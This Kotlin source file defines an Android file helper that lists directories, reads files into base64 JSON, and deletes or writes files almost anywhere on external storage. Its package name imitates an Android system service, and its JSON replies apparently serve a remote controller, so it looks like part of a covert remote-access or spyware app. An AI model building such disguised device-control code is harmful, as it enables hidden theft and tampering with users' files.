package com.android.systemservices

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class FileHelper(private val context: Context) {
    private val TAG = "FileHelper"

    fun listDirectory(path: String): JSONObject {
        val result = JSONObject()
        result.put("path", path)
        val files = JSONArray()
        try {
            val dir = File(path).canonicalFile
            if (isBlockedPath(dir.absolutePath)) {
                result.put("error", "Permission denied")
                result.put("files", files)
                return result
            }
            if (!dir.exists() || !dir.isDirectory) {
                result.put("error", "Not a directory")
                result.put("files", files)
                return result
            }
            dir.listFiles()
                ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                ?.forEach { f ->
                    files.put(JSONObject().apply {
                        put("name", f.name)
                        put("path", f.absolutePath)
                        put("isDir", f.isDirectory)
                        put("size", if (f.isFile) f.length() else 0)
                        put("modified", f.lastModified())
                        put("readable", f.canRead())
                    })
                }
        } catch (e: SecurityException) {
            result.put("error", "Permission denied")
        } catch (e: Exception) {
            Log.e(TAG, "listDirectory error", e)
            result.put("error", e.message ?: "Unknown error")
        }
        result.put("files", files)
        return result
    }

    fun readFile(path: String): JSONObject {
        val result = JSONObject()
        result.put("path", path)
        try {
            val file = File(path).canonicalFile
            if (isBlockedPath(file.absolutePath)) { result.put("error", "Permission denied"); return result }
            if (!file.exists()) { result.put("error", "File not found"); return result }
            if (!file.isFile)   { result.put("error", "Not a file");     return result }
            if (file.length() > 50 * 1024 * 1024) { result.put("error", "File too large (>50MB)"); return result }
            val bytes = file.readBytes()
            result.put("base64", Base64.encodeToString(bytes, Base64.NO_WRAP))
            result.put("size", bytes.size)
            result.put("name", file.name)
        } catch (e: SecurityException) {
            result.put("error", "Permission denied")
        } catch (e: Exception) {
            Log.e(TAG, "readFile error", e)
            result.put("error", e.message ?: "Read failed")
        }
        return result
    }

    fun deleteFile(path: String): JSONObject {
        val result = JSONObject()
        result.put("path", path)
        try {
            val file = File(path).canonicalFile
            if (isBlockedPath(file.absolutePath)) { result.put("success", false); result.put("error", "Permission denied"); return result }
            if (!file.exists()) { result.put("success", false); result.put("error", "File not found"); return result }
            if (file.isDirectory) { result.put("success", false); result.put("error", "Path is a directory"); return result }

            // Try direct File.delete() first (works with MANAGE_EXTERNAL_STORAGE on Android 11+)
            if (file.delete()) {
                notifyMediaStore(file.absolutePath)
                result.put("success", true)
                return result
            }

            // Fallback: delete via MediaStore ContentResolver
            val deleted = deleteViaMediaStore(file.absolutePath)
            if (deleted) {
                result.put("success", true)
            } else {
                result.put("success", false)
                result.put("error", "Delete failed — check MANAGE_EXTERNAL_STORAGE permission")
            }
        } catch (e: SecurityException) {
            result.put("success", false); result.put("error", "Permission denied: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "deleteFile error", e)
            result.put("success", false); result.put("error", e.message ?: "Delete failed")
        }
        return result
    }

    private fun notifyMediaStore(path: String) {
        try {
            context.contentResolver.delete(
                MediaStore.Files.getContentUri("external"),
                "${MediaStore.MediaColumns.DATA}=?",
                arrayOf(path)
            )
        } catch (_: Exception) {}
    }

    private fun deleteViaMediaStore(path: String): Boolean {
        val uris = listOf(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Files.getContentUri("external")
        )
        for (baseUri in uris) {
            try {
                val rows = context.contentResolver.delete(
                    baseUri,
                    "${MediaStore.MediaColumns.DATA}=?",
                    arrayOf(path)
                )
                if (rows > 0) return true
            } catch (_: Exception) {}
        }
        return false
    }

    fun writeFile(destDir: String, name: String, bytes: ByteArray): JSONObject {
        val result = JSONObject()
        try {
            val dir = File(destDir).canonicalFile
            if (isBlockedPath(dir.absolutePath)) { result.put("success", false); result.put("error", "Permission denied"); return result }
            if (!dir.exists()) dir.mkdirs()
            val target = File(dir, name).canonicalFile
            if (isBlockedPath(target.absolutePath)) { result.put("success", false); result.put("error", "Permission denied"); return result }
            target.writeBytes(bytes)
            scanNewFile(target.absolutePath)
            result.put("success", true)
            result.put("path", target.absolutePath)
        } catch (e: SecurityException) {
            result.put("success", false); result.put("error", "Permission denied: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "writeFile error", e)
            result.put("success", false); result.put("error", e.message ?: "Write failed")
        }
        return result
    }

    private fun scanNewFile(path: String) {
        try {
            android.media.MediaScannerConnection.scanFile(context, arrayOf(path), null, null)
        } catch (_: Exception) {}
    }

    fun defaultRoot(): String =
        Environment.getExternalStorageDirectory().absolutePath

    private fun isBlockedPath(canonical: String): Boolean {
        val blocked = listOf("/proc", "/sys", "/dev")
        return blocked.any { canonical == it || canonical.startsWith("$it/") }
    }
}
